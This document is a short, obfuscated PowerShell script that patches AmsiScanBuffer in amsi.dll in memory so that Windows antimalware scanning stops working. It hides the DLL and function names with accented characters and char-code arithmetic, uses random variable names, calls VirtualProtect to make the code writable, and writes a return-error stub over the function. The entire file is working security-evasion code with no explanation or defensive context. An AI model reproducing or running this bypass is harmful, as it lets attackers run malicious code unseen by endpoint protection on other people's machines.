$gLStQIU66z = @"
using System;
using System.Runtime.InteropServices;
public class gLStQIU66z {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr FJ8KivE1B, string djtJ4NeUXhwNh);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr ZVGNmVUyumsqaA0NLH, UIntPtr co5q, uint ypoyRSo1rqWadz0m, out uint sJinDcmcl0L1LKISoHO);
}
"@

Add-Type $gLStQIU66z

$GmR_Lh3KEH7A7 = [gLStQIU66z]::LoadLibrary("$(('áms'+'í.d'+'ll').noRMaliZe([ChAR]([Byte]0x46)+[CHar]([bYtE]0x6f)+[cHAR]([ByTe]0x72)+[cHaR]([BYtE]0x6d)+[CHar]([byTe]0x44)) -replace [CHar](54+38)+[cHAR]([BYte]0x70)+[ChAR](123*12/12)+[cHAr]([bytE]0x4d)+[ChAR]([bYTE]0x6e)+[CHar](50+75))")
$h50qlhKa7DRS = [gLStQIU66z]::GetProcAddress($GmR_Lh3KEH7A7, "$(('ÀmsìScâ'+'nBùffèr').NoRmALiZE([CHaR]([byTe]0x46)+[CHAr]([bYtE]0x6f)+[Char]([byTe]0x72)+[cHAR]([bYtE]0x6d)+[CHAr]([bYte]0x44)) -replace [chAR](92)+[Char]([Byte]0x70)+[Char]([bYTe]0x7b)+[chAR]([bYte]0x4d)+[cHAR]([ByTE]0x6e)+[ChaR](125+81-81))")
$p = 0
[gLStQIU66z]::VirtualProtect($h50qlhKa7DRS, [uint32]5, 0x40, [ref]$p)
$U3YwcDUQdwqveuqfxDoK = "0xB8"
$KJg4kG8tlur7xF = "0x57"
$JQPRQm1A = "0x00"
$VWMBezyv14 = "0x07"
$lcRYfCDXj3T6tWb3YK = "0x80"
$BJ9crm6LGMdw = "0xC3"
$PG3u66F = [Byte[]] ($U3YwcDUQdwqveuqfxDoK,$KJg4kG8tlur7xF,$JQPRQm1A,$VWMBezyv14,+$lcRYfCDXj3T6tWb3YK,+$BJ9crm6LGMdw)
[System.Runtime.InteropServices.Marshal]::Copy($PG3u66F, 0, $h50qlhKa7DRS, 6)